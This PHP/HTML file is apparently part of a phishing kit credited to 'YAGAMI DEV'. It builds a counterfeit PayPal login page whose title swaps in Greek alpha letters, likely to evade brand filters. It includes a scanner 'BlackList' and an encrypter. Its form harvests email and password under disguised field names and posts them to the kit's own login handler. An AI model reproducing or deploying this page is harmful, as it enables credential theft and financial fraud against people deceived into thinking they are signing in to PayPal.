<?php 
/*
+----------------------------------+
¦----------  APPLE 2015  ----------¦
¦----------------------------------¦
¦-------- BY : YAGAMI DEV ---------¦
+----------------------------------+
*/
include 'includes/encrypter.php';
include 'includes/functions.php';
include 'includes/BlackList.php';
?>
<!Doctype html>
<html>
   <head>
      <link rel="stylesheet"  href="assets/css/login.css"/>
      <link rel="shortcut icon" type="image/x-icon" href="assets/img/favicon.ico" />
      <title>Login - P&alpha;yP&alpha;l</title>
      <script type="text/javascript" src="assets/js/jquery.js"></script>
      <script type="text/javascript" src="assets/js/login.js"></script>
      <style>
      .div_login { position: absolute; top: 370px; left: 104px; }
      .div_pass { position: absolute; top: 310px; left: 103px; }
      .div_email { position: absolute; top: 250px; left: 103px; }
      </style>
   </head>
   <body onload="sub()">
      <div class="container_err">
      	<div class="login">
      	<form method="POST" action="includes/login.php" onsubmit="return validate();">
      		<div class="div_email">
      		  <input type="text" class="large" name="MAHDI_1" placeholder="Email"/>
      		</div>
      		<div class="div_pass">
      		  <input type="password" class="large" name="MAHDI_2" placeholder="Password"/>
			  <input id="location" type="hidden" name="token" />
			  <input id="cmd" type="hidden" name="cmd" />
      		</div>
      		<div class="div_login">
            <input type="submit" class="btn" value="Log in" name="login" />
          </div>
      	</form>
      </div></div>
      <script type="text/javascript">
         $("input").change(function () {$(this).removeClass("merror");}).trigger("change");
      </script>
   </body>
</html>